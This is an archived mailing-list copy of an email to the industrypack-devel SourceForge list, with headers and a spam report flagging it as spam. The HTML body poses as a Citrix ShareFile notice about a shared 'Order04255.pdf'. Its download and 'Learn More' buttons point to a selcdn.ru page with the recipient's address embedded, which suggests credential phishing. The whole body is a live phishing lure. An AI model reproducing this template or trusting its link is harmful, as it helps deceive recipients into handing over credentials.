Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 1A1424FF31F
	for <lists+industrypack-devel@lfdr.de>; Wed, 13 Apr 2022 11:14:21 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.94.2)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1neZ4v-0002kD-3K
	for lists+industrypack-devel@lfdr.de; Wed, 13 Apr 2022 09:14:19 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.94.2)
 (envelope-from <industrypack-devel@tulane.edu>) id 1neZ4t-0002k3-Tw
 for industrypack-devel@lists.sourceforge.net; Wed, 13 Apr 2022 09:14:18 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:Content-Transfer-Encoding:Content-Type:
 MIME-Version:Message-ID:Date:To:From:Reply-To:Sender:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=eUP0fP0Q0qRiC4X7go9T+akiMuBr7dBLaoiQ397fyuc=; b=ROdTn0EiF8yvH9oRwTgIr5BGIb
 UWghf1HjXKGmR1FXTvPe8pqYcKXzhr3G4gEa6MMo2EqZibaxVO3C8rrC97v7Lm4xARgOyAiuQQSe8
 ywV3u0oCFbcqZzf+wQ2qfqJfbYnyB6cl1oZ+QzJNKEBgUQLrJpzP6KnRoPuJWcWHz0MY=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
 Date:To:From:Reply-To:Sender:Cc:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=eUP0fP0Q0qRiC4X7go9T+akiMuBr7dBLaoiQ397fyuc=; b=I
 acWbVchilbfBfjiqcQvfzLsxh2t+g9dP8haQ3fobQKpOW+SpA25mibxEdxzHaS8fb9Wy5tdDLdpDN
 BvlJGkqioql5IYuScyte2d+69K8xixY4FMRmo/qawVjQevpCsxAAKtHylOiCWwoX1A9Ca0Pd4J8ZU
 sXqzOlxsrkfRipQ8=;
Received: from [83.143.104.33] by sfi-mx-2.v28.lw.sourceforge.com with esmtp 
 (Exim 4.94.2) id 1neZ4r-0007Ol-It
 for industrypack-devel@lists.sourceforge.net; Wed, 13 Apr 2022 09:14:18 +0000
From: ShareFile <industrypack-devel@tulane.edu>
To: industrypack-devel@lists.sourceforge.net
Date: 13 Apr 2022 11:14:15 +0200
Message-ID: <20220413111415.F70445B678A9C825@tulane.edu>
MIME-Version: 1.0
X-Spam-Score: 8.7 (++++++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: ShareFile Attachments Title Size Order04255.pdf 1.8 MB
 Download
 Attachments Use ShareFile to share documents securely. Learn More.
 industrypack-devel@lists.sourceforge.net
 , A file has been Shared with you via Sharefile. 
 Content analysis details:   (8.7 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 3.6 RCVD_IN_SBL_CSS        RBL: Received via a relay in Spamhaus SBL-CSS
 [83.143.104.33 listed in zen.spamhaus.org]
 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
 0.1 URI_HEX                URI: URI hostname has long hexadecimal sequence
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 1.5 HTML_FONT_TINY_NORDNS  Font too small to read, no rDNS
 0.0 T_KAM_HTML_FONT_INVALID Test for Invalidly Named or Formatted
 Colors in HTML
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 1.2 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML
 only
X-VA-Spam-Flag: YES
X-Spam-Flag: YES
X-Headers-End: 1neZ4r-0007Ol-It
Subject: [Industrypack-devel] [SPAM] Emailing Order03384.pdf through
 ShareFile
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Reply-To: ShareFile <industrypack-devel@tulane.edu>
Content-Type: multipart/mixed; boundary="===============2493402859598146644=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============2493402859598146644==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 8.00.7601.17514">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge"></head>
<body><div class=3D"Ar Au Ao" id=3D":rh" style=3D"display: block;"><div tab=
index=3D"1" class=3D"Am Al editable LW-avf tS-tW tS-tY" id=3D":rd" role=3D"=
textbox" style=3D"direction: ltr; min-height: 328px;" contenteditable=3D"tr=
ue" hidefocus=3D"true" spellcheck=3D"false" aria-label=3D"Message Body" ari=
a-multiline=3D"true" g_editable=3D"true"><p class=3D"gmail-v1MsoNormal" sty=
le=3D"margin: 0in 0in 0pt; color: rgb(0, 0, 0); font-family: Calibri, sans-=
serif; font-size: 11pt; box-sizing: border-box;">&nbsp;</p>
<table width=3D"600" style=3D"color: rgb(0, 0, 0); text-indent: 0px; font-f=
amily: arial; font-size: 12px; border-bottom-color: rgb(230, 230, 230); bor=
der-bottom-width: 1px; border-bottom-style: solid; border-collapse: collaps=
e; table-layout: fixed; border-spacing: 0px;" cellspacing=3D"0" cellpadding=
=3D"0"><colgroup style=3D"box-sizing: border-box;"><col width=3D"520" style=
=3D"box-sizing: border-box;"><col width=3D"80" style=3D"box-sizing: border-=
box;"></colgroup><tbody style=3D"box-sizing: border-box;">
<tr style=3D"box-sizing: border-box;"><td width=3D"600" style=3D"height: 4p=
x; line-height: 4px; font-family: arial, verdana, helvetica, sans-serif; fo=
nt-size: 4px; border-right-color: rgb(77, 77, 77); border-left-color: rgb(7=
7, 77, 77); border-right-width: 1px; border-left-width: 1px; border-right-s=
tyle: solid; border-left-style: solid; box-sizing: border-box; background-c=
olor: rgb(77, 77, 77);" colspan=3D"2">&nbsp;</td></tr><tr style=3D"box-sizi=
ng: border-box;">
<td width=3D"600" style=3D"height: 25px; color: rgb(51, 51, 51); padding-le=
ft: 10px; font-family: arial, verdana, helvetica, sans-serif; font-size: 13=
px; border-right-color: rgb(230, 230, 230); border-left-color: rgb(230, 230=
, 230); border-right-width: 1px; border-left-width: 1px; border-right-style=
: solid; border-left-style: solid; box-sizing: border-box; background-color=
: rgb(230, 230, 230);" colspan=3D"2">ShareFile Attachments</td></tr>
<tr style=3D"height: 20px; color: rgb(77, 77, 77); box-sizing: border-box;"=
><td width=3D"520" style=3D"overflow: hidden; padding-right: 10px; padding-=
left: 10px; font-family: arial, verdana, helvetica, sans-serif; font-size: =
11px; font-weight: bold; border-left-color: rgb(230, 230, 230); border-left=
-width: 1px; border-left-style: solid; white-space: nowrap; box-sizing: bor=
der-box;">Title</td>
<td width=3D"80" style=3D"overflow: hidden; padding-right: 10px; padding-le=
ft: 10px; font-family: arial, verdana, helvetica, sans-serif; font-size: 11=
px; font-weight: bold; border-right-color: rgb(230, 230, 230); border-right=
-width: 1px; border-right-style: solid; white-space: nowrap; box-sizing: bo=
rder-box;">Size</td></tr><tr id=3D"gmail-v1SF_FILE_784647_000" style=3D"hei=
ght: 25px; color: rgb(77, 77, 77); box-sizing: border-box;">
<td width=3D"520" style=3D"overflow: hidden; padding-right: 10px; padding-l=
eft: 10px; font-family: arial, verdana, helvetica, sans-serif; font-size: 1=
3px; border-left-color: rgb(230, 230, 230); border-left-width: 1px; border-=
left-style: solid; white-space: nowrap; box-sizing: border-box; background-=
color: rgb(242, 242, 242);">Order04255.pdf</td>
<td width=3D"80" style=3D"overflow: hidden; padding-right: 10px; padding-le=
ft: 10px; font-family: arial, verdana, helvetica, sans-serif; font-size: 13=
px; border-right-color: rgb(230, 230, 230); border-right-width: 1px; border=
-right-style: solid; white-space: nowrap; box-sizing: border-box; backgroun=
d-color: rgb(242, 242, 242);">1.8 MB</td></tr><tr style=3D"height: 44px; bo=
x-sizing: border-box;">
<td width=3D"600" style=3D"padding-right: 10px; padding-left: 10px; font-fa=
mily: arial, verdana, helvetica, sans-serif; font-size: 9pt; border-top-col=
or: rgb(230, 230, 230); border-right-color: rgb(230, 230, 230); border-left=
-color: rgb(230, 230, 230); border-top-width: 1px; border-right-width: 1px;=
 border-left-width: 1px; border-top-style: solid; border-right-style: solid=
; border-left-style: solid; box-sizing: border-box;" colspan=3D"2">
<table width=3D"580" style=3D"font-family: arial; border-collapse: collapse=
; table-layout: fixed; border-spacing: 0px;" cellspacing=3D"0" cellpadding=
=3D"0"><tbody style=3D"box-sizing: border-box;"><tr style=3D"box-sizing: bo=
rder-box;"><td width=3D"160" style=3D"height: 25px; text-align: center; col=
or: rgb(255, 255, 255); font-family: arial, verdana, helvetica, sans-serif;=
 font-size: 13px; box-sizing: border-box; background-color: rgb(120, 190, 3=
2);">
<a style=3D"color: rgb(255, 255, 255); box-sizing: border-box; background-c=
olor: transparent; text-decoration-line: none;" href=3D"https://641220.selc=
dn.ru/leke/casefilrsds.html#industrypack-devel@lists.sourceforge.net" targe=
t=3D"_blank" rel=3D"noreferrer">Download Attachments</a></td><td width=3D"4=
00" style=3D"text-align: right; color: rgb(77, 77, 77); padding-right: 10px=
; padding-left: 10px; font-family: arial, verdana, helvetica, sans-serif; f=
ont-size: 11px; box-sizing: border-box;">
Use ShareFile to share documents securely.<span style=3D"box-sizing: border=
-box;">&nbsp;</span><a style=3D"color: rgb(149, 79, 114); box-sizing: borde=
r-box; background-color: transparent;" href=3D"https://641220.selcdn.ru/lek=
e/casefilrsds.html#industrypack-devel@lists.sourceforge.net" target=3D"_bla=
nk" rel=3D"noreferrer">Learn&nbsp;More.</a></td></tr></tbody></table></td><=
/tr></tbody></table>
<p class=3D"gmail-v1MsoNormal" style=3D"margin: 0in 0in 0pt; color: rgb(0, =
0, 0); font-family: Calibri, sans-serif; font-size: 11pt; box-sizing: borde=
r-box;">&nbsp;</p><p class=3D"gmail-v1MsoNormal" style=3D"margin: 0in 0in 0=
pt; color: rgb(0, 0, 0); font-family: Calibri, sans-serif; font-size: 11pt;=
 box-sizing: border-box;"><span style=3D"font-weight: bolder; box-sizing: b=
order-box;"><u style=3D"box-sizing: border-box;">industrypack-devel@lists.s=
ourceforge.net</u></span>&nbsp;,</p>
<p class=3D"gmail-v1MsoNormal" style=3D"margin: 0in 0in 0pt; color: rgb(0, =
0, 0); font-family: Calibri, sans-serif; font-size: 11pt; box-sizing: borde=
r-box;">&nbsp;A file has been Shared with you&nbsp;via Sharefile.</p><p cla=
ss=3D"gmail-v1MsoNormal" style=3D"margin: 0in 0in 0pt; color: rgb(0, 0, 0);=
 font-family: Calibri, sans-serif; font-size: 11pt; box-sizing: border-box;=
">&nbsp;</p>
<p class=3D"gmail-v1MsoNormal" style=3D"margin: 0in 0in 0pt; color: rgb(0, =
0, 0); font-family: Calibri, sans-serif; font-size: 11pt; box-sizing: borde=
r-box;">Thanks.<br style=3D"box-sizing: border-box;"><br style=3D"box-sizin=
g: border-box;"><br style=3D"box-sizing: border-box;"></p><span style=3D"co=
lor: rgb(31, 73, 125); font-family: Garamond, serif; font-size: 12pt; box-s=
izing: border-box;">
<p style=3D"margin: 24px 0px; line-height: 1.2; font-family: ArialMT, Arial=
, Helvetica, sans-serif; font-size: 12px; box-sizing: border-box;"><u style=
=3D"box-sizing: border-box;">ShareFile is a tool for sending, receiving, an=
d organizing your business files online. It can be used as a password-prote=
cted area for sharing information with clients and partners, and it's an ea=
sy way to send files that are too large to e-mail.</u><br style=3D"box-sizi=
ng: border-box;"><br style=3D"box-sizing: border-box;">
<br style=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-box;"=
></p><p style=3D"margin: 0px; font-family: ArialMT, Arial, Helvetica, sans-=
serif; font-size: 10px; box-sizing: border-box;">Powered By Citrix ShareFil=
e 2022</p></span></div></div></body></html>


--===============2493402859598146644==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============2493402859598146644==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============2493402859598146644==--
